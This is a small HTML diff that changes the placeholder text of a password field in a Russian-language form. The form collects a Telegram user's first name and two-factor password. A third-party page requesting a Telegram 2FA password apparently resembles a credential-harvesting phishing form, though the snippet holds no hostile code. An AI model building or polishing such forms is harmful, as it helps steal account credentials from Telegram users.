@@ -110,7 +110,7 @@
             <input type="text" name="tg_first_name" class="formInput" placeholder="James">
         </div>
         <div class="telegramAuth" data-name="tg_password">
-            <input type="text" name="tg_password" class="formInput" placeholder="krutoiparol">
+            <input type="text" name="tg_password" class="formInput" placeholder="2FA Пароль">
         </div>
         <button class="formBtn">Далее</button>
     </form>
